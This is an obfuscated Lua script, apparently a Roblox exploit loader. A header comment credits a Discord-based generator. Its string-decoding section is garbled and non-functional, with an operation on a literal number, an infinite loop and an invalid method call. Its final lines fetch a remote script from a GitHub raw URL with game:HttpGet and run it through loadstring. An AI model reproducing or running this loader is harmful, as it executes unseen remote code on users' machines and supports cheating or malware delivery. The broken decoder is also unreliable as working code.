-- ts file was generated at discord.gg/25ms

local lookup = {}
local floor_fn = math.floor
local random_fn = math.random
local remove_fn = table.remove
local char_fn = string.char
local n1 = 0
local n2 = 2
local lookup_2 = {}
local n3 = 1

for i = 1, 256, 1 do
    lookup[i] = i
end

local v0 = #lookup
local v1 = #lookup == 0

repeat
    v1 = random_fn(1, #lookup)
    v0 = remove_fn(lookup, v1)
    n3 = char_fn(v0 - 1)
    lookup_2[v0] = n3
until #lookup == 0

local callback_fn = function(arg1, arg2, arg3)
    local v0

    if #0 == 0 then
        n1 = (n1 * 189 + 28402211648425) % 35184372088832

        repeat until false

        v0 = floor_fn(n1 / 2 ^ (13 - (n2 - n2 % 32) / 32))

        floor_fn((((v0 % 4294967296) / 2 ^ (n2 % 32)) % 1) * 4294967296)
        floor_fn((v0 % 4294967296) / 2 ^ (n2 % 32))
    end

    return table.remove(v0)
end
local callback_fn_ref = callback_fn

callback_fn = {}
n3 = callback_fn

setmetatable({}, {
    __index = callback_fn,
    __metatable = nil,
})

callback_fn = function(arg1, arg2, arg3, arg4, arg5, arg6)
    local lookup_2_ref, v0, n1, v1, v2
    local n3_ref = n3

    if n3[arg2] then
    else
        lookup_2_ref = lookup_2
        v0 = string.len(arg1)
        n3_ref[arg2] = ''
        n1 = 28

        for i = 1, v0.len(arg1), 1 do
            v2 = string.byte(arg1, i)
            v1 = callback_fn_ref()
            n3_ref[arg2] = n3_ref[arg2] .. lookup_2_ref[((v2 + v1) + n1) % 256 + 1]
        end
    end

    return arg2
end
char_fn = {
    game:HttpGet('https://raw.githubusercontent.com/imcomingforyou6959-gif/RPL/refs/heads/main/NewMainScript.lua', true),
}
floor_fn = loadstring((unpack or table.unpack)(char_fn))

floor_fn()
